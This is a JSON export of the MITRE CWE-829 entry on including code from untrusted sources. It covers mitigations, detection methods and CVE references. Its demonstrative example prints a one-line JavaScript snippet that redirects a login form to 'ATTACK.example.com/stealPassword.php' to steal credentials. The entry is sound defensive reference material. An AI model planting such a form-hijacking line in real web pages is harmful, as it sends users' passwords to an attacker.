{
  "id": "829",
  "name": "Inclusion of Functionality from Untrusted Control Sphere",
  "abstraction": "Base",
  "structure": "Simple",
  "status": "Incomplete",
  "description": "The software imports, requires, or includes executable functionality (such as a library) from a source that is outside of the intended control sphere.",
  "extended_description": "\n            \u003cxhtml:p\u003eWhen including third-party functionality, such as a web widget, library, or other source of functionality, the software must effectively trust that functionality. Without sufficient protection mechanisms, the functionality could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). The functionality might also contain its own weaknesses, or grant access to additional functionality and state information that should be kept private to the base system, such as system state information, sensitive application data, or the DOM of a web application.\u003c/xhtml:p\u003e\n            \u003cxhtml:p\u003eThis might lead to many different consequences depending on the included functionality, but some examples include injection of malware, information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware (CWE-601).\u003c/xhtml:p\u003e\n         ",
  "related_weaknesses": [
    {
      "nature": "ChildOf",
      "cweid": "669",
      "view_id": "1000",
      "ordinal": "Primary"
    },
    {
      "nature": "ChildOf",
      "cweid": "669",
      "view_id": "1003",
      "ordinal": "Primary"
    }
  ],
  "applicable_platforms": {},
  "modes_of_introduction": [
    {
      "phase": "Implementation",
      "note": [
        "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
      ]
    }
  ],
  "common_consequences": [
    {
      "scope": [
        "Confidentiality",
        "Integrity",
        "Availability"
      ],
      "impact": [
        "Execute Unauthorized Code or Commands"
      ],
      "note": "An attacker could insert malicious functionality into the program by causing the program to download code that the attacker has placed into the untrusted control sphere, such as a malicious web site."
    }
  ],
  "potential_mitigations": [
    {
      "mitigation_id": "MIT-4",
      "phase": [
        "Architecture and Design"
      ],
      "description": [
        "Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid."
      ],
      "strategy": "Libraries or Frameworks"
    },
    {
      "mitigation_id": "MIT-21.1",
      "phase": [
        "Architecture and Design"
      ],
      "description": [
        "\n                  \u003cxhtml:p\u003eWhen the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.\u003c/xhtml:p\u003e\n                  \u003cxhtml:p\u003eFor example, ID 1 could map to \"inbox.txt\" and ID 2 could map to \"profile.txt\". Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.\u003c/xhtml:p\u003e\n               "
      ],
      "strategy": "Enforcement by Conversion"
    },
    {
      "mitigation_id": "MIT-15",
      "phase": [
        "Architecture and Design"
      ],
      "description": [
        "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."
      ]
    },
    {
      "mitigation_id": "MIT-22",
      "phase": [
        "Architecture and Design",
        "Operation"
      ],
      "description": [
        "\n                  \u003cxhtml:p\u003eRun the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.\u003c/xhtml:p\u003e\n                  \u003cxhtml:p\u003eOS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.\u003c/xhtml:p\u003e\n                  \u003cxhtml:p\u003eThis may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.\u003c/xhtml:p\u003e\n                  \u003cxhtml:p\u003eBe careful to avoid CWE-243 and other weaknesses related to jails.\u003c/xhtml:p\u003e\n               "
      ],
      "effectiveness": "Limited",
      "effectiveness_notes": "The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.",
      "strategy": "Sandbox or Jail"
    },
    {
      "mitigation_id": "MIT-17",
      "phase": [
        "Architecture and Design",
        "Operation"
      ],
      "description": [
        "Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."
      ],
      "strategy": "Environment Hardening"
    },
    {
      "mitigation_id": "MIT-5.1",
      "phase": [
        "Implementation"
      ],
      "description": [
        "\n                  \u003cxhtml:p\u003eAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\u003c/xhtml:p\u003e\n                  \u003cxhtml:p\u003eWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\u003c/xhtml:p\u003e\n                  \u003cxhtml:p\u003eDo not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\u003c/xhtml:p\u003e\n                  \u003cxhtml:p\u003eWhen validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single \".\" character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as \"/\" to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434.\u003c/xhtml:p\u003e\n                  \u003cxhtml:p\u003eDo not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering \"/\" is insufficient protection if the filesystem also supports the use of \"\\\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if \"../\" sequences are removed from the \".../...//\" string in a sequential fashion, two instances of \"../\" would be removed from the original string, but the remaining characters would still form the \"../\" string.\u003c/xhtml:p\u003e\n               "
      ],
      "effectiveness": "High",
      "strategy": "Input Validation"
    },
    {
      "mitigation_id": "MIT-34",
      "phase": [
        "Architecture and Design",
        "Operation"
      ],
      "description": [
        "\n                  \u003cxhtml:p\u003eStore library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.\u003c/xhtml:p\u003e\n                  \u003cxhtml:p\u003eThis significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.\u003c/xhtml:p\u003e\n               "
      ],
      "strategy": "Attack Surface Reduction"
    },
    {
      "mitigation_id": "MIT-6",
      "phase": [
        "Architecture and Design",
        "Implementation"
      ],
      "description": [
        "\n                  \u003cxhtml:p\u003eUnderstand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.\u003c/xhtml:p\u003e\n                  \u003cxhtml:p\u003eMany file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.\u003c/xhtml:p\u003e\n               "
      ],
      "strategy": "Attack Surface Reduction"
    },
    {
      "mitigation_id": "MIT-29",
      "phase": [
        "Operation"
      ],
      "description": [
        "Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth."
      ],
      "effectiveness": "Moderate",
      "effectiveness_notes": "An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.",
      "strategy": "Firewall"
    }
  ],
  "demonstrative_examples": [
    {
      "demonstrative_example_id": "DX-94",
      "text": "\n               \u003cIntro_Text\u003eThis login webpage includes a weather widget from an external website:\u003c/Intro_Text\u003e\n               \u003cExample_Code Nature=\"bad\" Language=\"HTML\"\u003e\n                  \u003cxhtml:div\u003e\u0026lt;div class=\"header\"\u0026gt; Welcome!\u003cxhtml:div style=\"margin-left:10px;\"\u003e\u0026lt;div id=\"loginBox\"\u0026gt;Please Login:\u003cxhtml:div style=\"margin-left:10px;\"\u003e\u0026lt;form id =\"loginForm\" name=\"loginForm\" action=\"login.php\" method=\"post\"\u0026gt;\u003cxhtml:br/\u003eUsername: \u0026lt;input type=\"text\" name=\"username\" /\u0026gt;\u003cxhtml:br/\u003e\u0026lt;br/\u0026gt;\u003cxhtml:br/\u003ePassword: \u0026lt;input type=\"password\" name=\"password\" /\u0026gt;\u003cxhtml:br/\u003e\u0026lt;input type=\"submit\" value=\"Login\" /\u0026gt;\u003cxhtml:br/\u003e\u0026lt;/form\u0026gt;\u003c/xhtml:div\u003e\u0026lt;/div\u0026gt;\u003cxhtml:br/\u003e\u0026lt;div id=\"WeatherWidget\"\u0026gt;\u003cxhtml:div style=\"margin-left:10px;\"\u003e\u0026lt;script type=\"text/javascript\" src=\"externalDomain.example.com/weatherwidget.js\"\u0026gt;\u0026lt;/script\u0026gt;\u003c/xhtml:div\u003e\u0026lt;/div\u0026gt;\u003c/xhtml:div\u003e\u0026lt;/div\u0026gt;\u003c/xhtml:div\u003e\n               \u003c/Example_Code\u003e\n               \u003cBody_Text\u003eThis webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79).\u003c/Body_Text\u003e\n               \u003cBody_Text\u003eFor example, user login information could easily be stolen with a single line added to weatherwidget.js:\u003c/Body_Text\u003e\n               \u003cExample_Code Nature=\"attack\" Language=\"JavaScript\"\u003e\n                  \u003cxhtml:div\u003e\n                     \u003cxhtml:br/\u003e\n                     \u003cxhtml:i\u003e...Weather widget code....\u003c/xhtml:i\u003e\n                     \u003cxhtml:br/\u003edocument.getElementById('loginForm').action = \"ATTACK.example.com/stealPassword.php\";\u003c/xhtml:div\u003e\n               \u003c/Example_Code\u003e\n               \u003cBody_Text\u003eThis line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site.\u003c/Body_Text\u003e\n            "
    }
  ],
  "observed_examples": [
    {
      "reference": "CVE-2010-2076",
      "description": "Product does not properly reject DTDs in SOAP messages, which allows remote attackers to read arbitrary files, send HTTP requests to intranet servers, or cause a denial of service.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2076"
    },
    {
      "reference": "CVE-2004-0285",
      "description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0285"
    },
    {
      "reference": "CVE-2004-0030",
      "description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0030"
    },
    {
      "reference": "CVE-2004-0068",
      "description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0068"
    },
    {
      "reference": "CVE-2005-2157",
      "description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2157"
    },
    {
      "reference": "CVE-2005-2162",
      "description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2162"
    },
    {
      "reference": "CVE-2005-2198",
      "description": "Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2198"
    },
    {
      "reference": "CVE-2004-0128",
      "description": "Modification of assumed-immutable variable in configuration script leads to file inclusion.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0128"
    },
    {
      "reference": "CVE-2005-1864",
      "description": "PHP file inclusion.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1864"
    },
    {
      "reference": "CVE-2005-1869",
      "description": "PHP file inclusion.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1869"
    },
    {
      "reference": "CVE-2005-1870",
      "description": "PHP file inclusion.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1870"
    },
    {
      "reference": "CVE-2005-2154",
      "description": "PHP local file inclusion.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2154"
    },
    {
      "reference": "CVE-2002-1704",
      "description": "PHP remote file include.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1704"
    },
    {
      "reference": "CVE-2002-1707",
      "description": "PHP remote file include.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1707"
    },
    {
      "reference": "CVE-2005-1964",
      "description": "PHP remote file include.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1964"
    },
    {
      "reference": "CVE-2005-1681",
      "description": "PHP remote file include.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1681"
    },
    {
      "reference": "CVE-2005-2086",
      "description": "PHP remote file include.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2086"
    },
    {
      "reference": "CVE-2004-0127",
      "description": "Directory traversal vulnerability in PHP include statement.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0127"
    },
    {
      "reference": "CVE-2005-1971",
      "description": "Directory traversal vulnerability in PHP include statement.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1971"
    },
    {
      "reference": "CVE-2005-3335",
      "description": "PHP file inclusion issue, both remote and local; local include uses \"..\" and \"%00\" characters as a manipulation, but many remote file inclusion issues probably have this vector.",
      "link": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3335"
    }
  ],
  "references": [
    {
      "reference_id": "REF-45",
      "author": [
        "OWASP"
      ],
      "title": "OWASP Enterprise Security API (ESAPI) Project",
      "url": "http://www.owasp.org/index.php/ESAPI"
    },
    {
      "reference_id": "REF-76",
      "author": [
        "Sean Barnum",
        "Michael Gegick"
      ],
      "title": "Least Privilege",
      "url": "https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html",
      "publication_year": "2005",
      "publication_month": "--09",
      "publication_day": "---14"
    }
  ],
  "content_history": {
    "submission": {
      "submission_name": "CWE Content Team",
      "submission_organization": "MITRE",
      "submission_date": "2010-11-29T00:00:00Z"
    },
    "modification": [
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2011-06-01T00:00:00Z",
        "modification_comment": "updated Common_Consequences"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2011-06-27T00:00:00Z",
        "modification_comment": "updated Common_Consequences, Demonstrative_Examples, Observed_Examples, Potential_Mitigations, Related_Attack_Patterns, Relationships"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2011-09-13T00:00:00Z",
        "modification_comment": "updated Potential_Mitigations, References, Relationships"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2012-05-11T00:00:00Z",
        "modification_comment": "updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2012-10-30T00:00:00Z",
        "modification_comment": "updated Potential_Mitigations"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2014-07-30T00:00:00Z",
        "modification_comment": "updated Detection_Factors"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2017-01-19T00:00:00Z",
        "modification_comment": "updated Relationships"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2017-05-03T00:00:00Z",
        "modification_comment": "updated Related_Attack_Patterns"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2017-11-08T00:00:00Z",
        "modification_comment": "updated Modes_of_Introduction, Relationships"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2019-01-03T00:00:00Z",
        "modification_comment": "updated Related_Attack_Patterns"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2019-06-20T00:00:00Z",
        "modification_comment": "updated Related_Attack_Patterns, Relationships, Type"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2020-02-24T00:00:00Z",
        "modification_comment": "updated Potential_Mitigations, Relationships"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2020-06-25T00:00:00Z",
        "modification_comment": "updated Potential_Mitigations"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2021-03-15T00:00:00Z",
        "modification_comment": "updated Potential_Mitigations, Related_Attack_Patterns"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2021-10-28T00:00:00Z",
        "modification_comment": "updated Relationships"
      }
    ]
  },
  "detection_methods": [
    {
      "method": "Automated Static Analysis - Binary or Bytecode",
      "description": "\n                  \u003cxhtml:p\u003eAccording to SOAR, the following detection techniques may be useful:\u003c/xhtml:p\u003e\n                  \u003cxhtml:div style=\"margin-left:10px;\"\u003e\n                     \u003cxhtml:div\u003eCost effective for partial coverage:\u003c/xhtml:div\u003e\n                     \u003cxhtml:div style=\"margin-left:10px;\"\u003e\n                        \u003cxhtml:ul\u003e\n                           \u003cxhtml:li\u003eBytecode Weakness Analysis - including disassembler + source code weakness analysis\u003c/xhtml:li\u003e\n                        \u003c/xhtml:ul\u003e\n                     \u003c/xhtml:div\u003e\n                  \u003c/xhtml:div\u003e\n               ",
      "effectiveness": "SOAR Partial"
    },
    {
      "method": "Manual Static Analysis - Binary or Bytecode",
      "description": "\n                  \u003cxhtml:p\u003eAccording to SOAR, the following detection techniques may be useful:\u003c/xhtml:p\u003e\n                  \u003cxhtml:div style=\"margin-left:10px;\"\u003e\n                     \u003cxhtml:div\u003eCost effective for partial coverage:\u003c/xhtml:div\u003e\n                     \u003cxhtml:div style=\"margin-left:10px;\"\u003e\n                        \u003cxhtml:ul\u003e\n                           \u003cxhtml:li\u003eBinary / Bytecode disassembler - then use manual analysis for vulnerabilities \u0026amp; anomalies\u003c/xhtml:li\u003e\n                        \u003c/xhtml:ul\u003e\n                     \u003c/xhtml:div\u003e\n                  \u003c/xhtml:div\u003e\n               ",
      "effectiveness": "SOAR Partial"
    },
    {
      "method": "Dynamic Analysis with Manual Results Interpretation",
      "description": "\n                  \u003cxhtml:p\u003eAccording to SOAR, the following detection techniques may be useful:\u003c/xhtml:p\u003e\n                  \u003cxhtml:div style=\"margin-left:10px;\"\u003e\n                     \u003cxhtml:div\u003eCost effective for partial coverage:\u003c/xhtml:div\u003e\n                     \u003cxhtml:div style=\"margin-left:10px;\"\u003e\n                        \u003cxhtml:ul\u003e\n                           \u003cxhtml:li\u003eForced Path Execution\u003c/xhtml:li\u003e\n                           \u003cxhtml:li\u003eMonitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious\u003c/xhtml:li\u003e\n                        \u003c/xhtml:ul\u003e\n                     \u003c/xhtml:div\u003e\n                  \u003c/xhtml:div\u003e\n               ",
      "effectiveness": "SOAR Partial"
    },
    {
      "method": "Manual Static Analysis - Source Code",
      "description": "\n                  \u003cxhtml:p\u003eAccording to SOAR, the following detection techniques may be useful:\u003c/xhtml:p\u003e\n                  \u003cxhtml:div style=\"margin-left:10px;\"\u003e\n                     \u003cxhtml:div\u003eHighly cost effective:\u003c/xhtml:div\u003e\n                     \u003cxhtml:div style=\"margin-left:10px;\"\u003e\n                        \u003cxhtml:ul\u003e\n                           \u003cxhtml:li\u003eManual Source Code Review (not inspections)\u003c/xhtml:li\u003e\n                        \u003c/xhtml:ul\u003e\n                     \u003c/xhtml:div\u003e\n                     \u003cxhtml:div\u003eCost effective for partial coverage:\u003c/xhtml:div\u003e\n                     \u003cxhtml:div style=\"margin-left:10px;\"\u003e\n                        \u003cxhtml:ul\u003e\n                           \u003cxhtml:li\u003eFocused Manual Spotcheck - Focused manual analysis of source\u003c/xhtml:li\u003e\n                        \u003c/xhtml:ul\u003e\n                     \u003c/xhtml:div\u003e\n                  \u003c/xhtml:div\u003e\n               ",
      "effectiveness": "High"
    },
    {
      "method": "Automated Static Analysis - Source Code",
      "description": "\n                  \u003cxhtml:p\u003eAccording to SOAR, the following detection techniques may be useful:\u003c/xhtml:p\u003e\n                  \u003cxhtml:div style=\"margin-left:10px;\"\u003e\n                     \u003cxhtml:div\u003eCost effective for partial coverage:\u003c/xhtml:div\u003e\n                     \u003cxhtml:div style=\"margin-left:10px;\"\u003e\n                        \u003cxhtml:ul\u003e\n                           \u003cxhtml:li\u003eSource code Weakness Analyzer\u003c/xhtml:li\u003e\n                           \u003cxhtml:li\u003eContext-configured Source Code Weakness Analyzer\u003c/xhtml:li\u003e\n                        \u003c/xhtml:ul\u003e\n                     \u003c/xhtml:div\u003e\n                  \u003c/xhtml:div\u003e\n               ",
      "effectiveness": "SOAR Partial"
    },
    {
      "method": "Architecture or Design Review",
      "description": "\n                  \u003cxhtml:p\u003eAccording to SOAR, the following detection techniques may be useful:\u003c/xhtml:p\u003e\n                  \u003cxhtml:div style=\"margin-left:10px;\"\u003e\n                     \u003cxhtml:div\u003eHighly cost effective:\u003c/xhtml:div\u003e\n                     \u003cxhtml:div style=\"margin-left:10px;\"\u003e\n                        \u003cxhtml:ul\u003e\n                           \u003cxhtml:li\u003eInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)\u003c/xhtml:li\u003e\n                           \u003cxhtml:li\u003eFormal Methods / Correct-By-Construction\u003c/xhtml:li\u003e\n                        \u003c/xhtml:ul\u003e\n                     \u003c/xhtml:div\u003e\n                     \u003cxhtml:div\u003eCost effective for partial coverage:\u003c/xhtml:div\u003e\n                     \u003cxhtml:div style=\"margin-left:10px;\"\u003e\n                        \u003cxhtml:ul\u003e\n                           \u003cxhtml:li\u003eAttack Modeling\u003c/xhtml:li\u003e\n                        \u003c/xhtml:ul\u003e\n                     \u003c/xhtml:div\u003e\n                  \u003c/xhtml:div\u003e\n               ",
      "effectiveness": "High"
    }
  ],
  "related_attack_patterns": [
    "175",
    "201",
    "228",
    "251",
    "252",
    "253",
    "263",
    "549",
    "660"
  ]
}
